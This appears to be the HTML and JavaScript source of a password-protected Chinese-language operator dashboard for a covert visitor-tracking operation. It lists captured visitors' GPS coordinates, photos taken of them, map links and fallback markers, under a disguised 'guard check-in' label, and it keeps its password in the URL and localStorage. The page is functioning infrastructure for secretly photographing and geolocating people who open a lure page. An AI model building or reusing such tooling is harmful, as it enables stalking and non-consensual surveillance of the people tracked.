<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>访客数据后台</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: #0b0b0e; color: #7a8590; min-height: 100vh; padding: 20px 15px; }
        .container { max-width: 500px; margin: 0 auto; }

        /* ================= 登录验证遮罩层 ================= */
        #login-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0b0e; display: flex; justify-content: center; align-items: center; z-index: 999; }
        .login-box { background: #131419; border: 1px solid #1c1d24; border-radius: 8px; padding: 35px 25px; width: 90%; max-width: 350px; text-align: center; }
        .login-box h2 { font-size: 15px; margin-bottom: 20px; color: #10b981; font-weight: 500; letter-spacing: 0.5px; }
        .login-box input { width: 100%; background: #1a1b23; border: 1px solid #282a36; border-radius: 6px; padding: 12px; color: white; font-size: 16px; margin-bottom: 20px; text-align: center; outline: none; }
        .login-box input:focus { border-color: #10b981; }
        .login-box button { background: #1c1d24; color: #10b981; border: 1px solid #10b981; padding: 12px; width: 100%; border-radius: 6px; font-size: 14px; font-weight: bold; cursor: pointer; }
        #login-error { color: #ef4444; font-size: 13px; margin-top: 12px; }

        /* ================= 控制端顶栏 ================= */
        #main-content { display: none; }
        header { display: flex; align-items: center; margin-bottom: 25px; padding-left: 5px; }
        .status-dot { width: 10px; height: 10px; background-color: #00ff87; border-radius: 50%; box-shadow: 0 0 10px #00ff87; margin-right: 12px; }
        header h1 { font-size: 16px; color: #a0aec0; font-weight: 500; letter-spacing: 1px; }

        /* 四列网格统计块 */
        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 25px; }
        .stat-card { background-color: #121319; border: 1px solid #181921; border-radius: 6px; padding: 18px 5px; text-align: center; }
        .stat-num { font-size: 28px; font-weight: 500; color: #00ff87; margin-bottom: 8px; font-family: monospace; }
        .stat-label { font-size: 11px; color: #4a5568; line-height: 1.4; display: flex; flex-direction: column; align-items: center; justify-content: center; }

        /* 操作按钮组行 */
        .action-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 25px; padding-left: 2px; }
        .btn-panel { background: #1c1d24; border: 1px solid #232530; color: #718096; padding: 10px 0; border-radius: 6px; font-size: 13px; cursor: pointer; width: 72px; text-align: center; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .btn-panel span { font-size: 10px; margin-top: 2px; color: #4a5568; }
        .btn-danger { border-color: rgba(239, 68, 68, 0.4); color: #ef4444; background: rgba(239, 68, 68, 0.02); }
        .btn-danger span { color: rgba(239, 68, 68, 0.5); }
        .refresh-text { font-size: 11px; color: #3a3f4d; margin-left: auto; text-align: right; line-height: 1.3; padding-right: 5px; }

        /* ================= 数据大卡片 ================= */
        .data-card { background-color: #121319; border: 1px solid #16171d; border-radius: 10px; padding: 20px; margin-bottom: 20px; }
        .card-header { display: flex; align-items: center; border-bottom: 1px solid #1a1b23; padding-bottom: 14px; margin-bottom: 16px; }
        .serial-num { font-size: 12px; color: #4a5568; font-family: monospace; letter-spacing: 0.5px; }
        .badge { font-size: 11px; padding: 3px 8px; border-radius: 4px; font-weight: 500; margin-left: 8px; background: rgba(239, 68, 68, 0.08); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.15); }
        .badge.success { background: rgba(16, 185, 129, 0.08); color: #10b981; border-color: rgba(16, 185, 129, 0.15); }
        .card-time { font-size: 11px; color: #4a5568; margin-left: auto; text-align: right; font-family: monospace; line-height: 1.3; }

        /* 二列参数面板 */
        .info-grid { display: grid; grid-template-columns: 1.1fr 0.9fr; gap: 15px; }
        .info-section h3 { font-size: 12px; color: #718096; margin-bottom: 14px; display: flex; align-items: center; gap: 6px; font-weight: normal; }
        .info-section h3::before { content: '📍'; font-size: 10px; }
        .info-section.device h3::before { content: '🖥️'; }

        .info-text { font-size: 12px; color: #4a5568; line-height: 1.6; font-family: monospace; min-height: 40px; }
        .info-item { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 12px; line-height: 1.4; }
        .item-label { color: #4a5568; }
        .item-val { color: #a0aec0; font-family: monospace; text-align: right; }

        /* 地图选择链接 */
        .map-actions { display: flex; gap: 6px; margin-top: 12px; }
        .map-btn { flex: 1; text-align: center; padding: 5px 0; border-radius: 4px; font-size: 11px; text-decoration: none; border: 1px solid transparent; transition: all 0.2s; }
        .btn-gaode { background: rgba(16, 185, 129, 0.05); color: #10b981; border-color: rgba(16, 185, 129, 0.15); }
        .btn-gaode:hover { background: #10b981; color: #0b0c10; }
        .btn-google { background: rgba(66, 153, 225, 0.05); color: #4299e1; border-color: rgba(66, 153, 225, 0.15); }
        .btn-google:hover { background: #4299e1; color: #0b0c10; }

        /* 照片展示区 */
        .photo-box { width: 100%; border-radius: 4px; overflow: hidden; background: #0b0b0e; border: 1px solid #1a1b23; position: relative; display: flex; justify-content: center; align-items: center; margin-top: 12px; min-height: 120px; }
        .photo-box img { width: 100%; height: auto; object-fit: contain; max-height: 350px; display: block; }
        .photo-tip { position: absolute; bottom: 4px; right: 4px; background: rgba(0,0,0,0.5); padding: 2px 5px; font-size: 9px; color: #4a5568; border-radius: 2px; pointer-events: none; }

        #global-status { text-align: center; color: #4a5568; padding: 50px; font-size: 13px; font-family: monospace; letter-spacing: 1px; }
    </style>
</head>
<body>

<div id="login-overlay">
    <div class="login-box">
        <h2>🔒 CONTROL PANEL AUTHENTICATION</h2>
        <input type="password" id="pw-input" placeholder="输入控制端安全暗号" onkeydown="if(event.keyCode==13) verifyLogin()">
        <button onclick="verifyLogin()">ENTER SYSTEM</button>
        <div id="login-error"></div>
    </div>
</div>

<div class="container" id="main-content">
    <header>
        <div class="status-dot"></div>
        <h1>访客数据后台</h1>
    </header>

    <div class="stats-grid">
        <div class="stat-card">
            <div class="stat-num" id="stat-total">0</div>
            <div class="stat-label"><span>总访</span><span>问</span></div>
        </div>
        <div class="stat-card">
            <div class="stat-num" id="stat-gps">0</div>
            <div class="stat-label"><span>获取定</span><span>位</span></div>
        </div>
        <div class="stat-card">
            <div class="stat-num" id="stat-photo">0</div>
            <div class="stat-label"><span>获取照</span><span>片</span></div>
        </div>
        <div class="stat-card">
            <div class="stat-num" id="stat-today">0</div>
            <div class="stat-label"><span>今日访</span><span>问</span></div>
        </div>
    </div>

    <div class="action-bar">
        <button class="btn-panel" onclick="window.location.reload()">⟳<span>刷新</span></button>
        <button class="btn-panel" onclick="alert('数据导出通道正常保护中')">↓ 导出<span>JSON</span></button>
        <button class="btn-panel btn-danger" onclick="logout()">✕ 清空<span>数据</span></button>
        <div class="refresh-text">自动刷<br>新 30s</div>
    </div>

    <div id="global-status">加载中 . . .</div>
    <div id="records-container"></div>
</div>

<script>
    let activePw = localStorage.getItem('monitor_terminal_pw') || '';
    if (activePw) {
        document.getElementById('login-overlay').style.display = 'none';
        document.getElementById('main-content').style.display = 'block';
        fetchDashboardData(activePw);
    }

    function verifyLogin() {
        const input = document.getElementById('pw-input').value;
        if (!input) { showError("暗号不能为空"); return; }
        fetchDashboardData(input, true);
    }

    function logout() {
        localStorage.removeItem('monitor_terminal_pw');
        window.location.reload();
    }

    function showError(msg) {
        document.getElementById('login-error').innerText = msg;
    }

    async function fetchDashboardData(targetPw, isNewLogin = false) {
        const statusDiv = document.getElementById('global-status');
        try {
            const res = await fetch(`/submit?pw=${targetPw}`);
            const result = await res.json();

            if (!res.ok) throw new Error(result.error || "口令无效");

            if (isNewLogin) {
                localStorage.setItem('monitor_terminal_pw', targetPw);
                document.getElementById('login-overlay').style.display = 'none';
                document.getElementById('main-content').style.display = 'block';
            }

            statusDiv.style.display = 'none';
            const container = document.getElementById('records-container');
            container.innerHTML = '';

            const totalCount = result.data.length;
            let gpsSuccessCount = 0;
            let photoSuccessCount = totalCount;
            let todayCount = 0;
            const todayStr = new Date().toLocaleDateString('zh-CN');

            result.data.forEach((item, index) => {
                const isFallback = (item.lat === "0.0" || item.lat === "0" || item.lat === "IP_FALLBACK" || !item.lat);
                if (!isFallback) gpsSuccessCount++;

                if (item.time.includes(todayStr) || item.time.split(' ')[0] === todayStr) {
                    todayCount++;
                }

                const serialNum = "#" + String(totalCount - index).padStart(4, '0');
                const randomId = item.fileName.substring(8, 16).toUpperCase();

                const gaodeUrl = `https://uri.amap.com/marker?position=${item.lon},${item.lat}&name=验证定位点`;
                const googleUrl = `https://www.google.com/maps/search/?api=1&query=${item.lat},${item.lon}`;

                // 核心修复：直接使用 B2 规范的 URL Query 传参进行鉴权下载，绕过浏览器的 fetch CORS 封锁限制
                const directProtectedImgUrl = `${item.url}&Authorization=${encodeURIComponent(item.authToken)}`;

                const card = document.createElement('div');
                card.className = 'data-card';
                card.innerHTML = `
                    <div class="card-header">
                        <div class="serial-num">${serialNum}   |   ${randomId}</div>
                        <div class="badge ${isFallback ? '' : 'success'}">${isFallback ? '✕ 定位' : '✓ 定位'}</div>
                        <div class="badge success">✓ 照片</div>
                        <div class="card-time">${item.time.split(' ')[0]}<br>${item.time.split(' ')[1] || ''}</div>
                    </div>
                    
                    <div class="info-grid">
                        <div class="info-section">
                            <h3>位置信息</h3>
                            <div class="info-text" style="color: ${isFallback ? '#4a5568' : '#10b981'}">
                                ${isFallback ? '位置权限未允许' : `纬度: ${item.lat}<br>经度: ${item.lon}`}
                            </div>
                            <div class="map-actions">
                                <a class="map-btn btn-gaode" href="${gaodeUrl}" target="_blank">高德地图</a>
                                <a class="map-btn btn-google" href="${googleUrl}" target="_blank">谷歌地图</a>
                            </div>
                            
                            <div class="photo-box">
                                <img src="${directProtectedImgUrl}" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\' width=\'100\' height=\'40\'><text x=\'50%\' y=\'50%\' font-size=\'4\' fill=\'%23ef4444\' text-anchor=\'middle\'>图片加载失败</text></svg>'">
                                <div class="photo-tip">📱 长按保存</div>
                            </div>
                        </div>
                        
                        <div class="info-section device">
                            <h3>设备状态</h3>
                            <div class="info-item"><span class="item-label">业务</span><span class="item-val">守护打卡</span></div>
                            <div class="info-item"><span class="item-label">状态</span><span class="item-val" style="color: #10b981">已对齐</span></div>
                            <div class="info-item"><span class="item-label">核心</span><span class="item-val">FormData</span></div>
                            <div class="info-item"><span class="item-label">语言</span><span class="item-val">zh-CN</span></div>
                            <div class="info-item"><span class="item-label">来源</span><span class="item-val">直接访问</span></div>
                        </div>
                    </div>
                `;
                container.appendChild(card);
            });

            document.getElementById('stat-total').innerText = totalCount;
            document.getElementById('stat-gps').innerText = gpsSuccessCount;
            document.getElementById('stat-photo').innerText = photoSuccessCount;
            document.getElementById('stat-today').innerText = todayCount;

        } catch (err) {
            if (isNewLogin) showError("验证错误: " + err.message);
            else logout();
        }
    }

    setInterval(() => {
        let savedPw = localStorage.getItem('monitor_terminal_pw');
        if (savedPw) fetchDashboardData(savedPw);
    }, 30000);
</script>
</body>
</html>
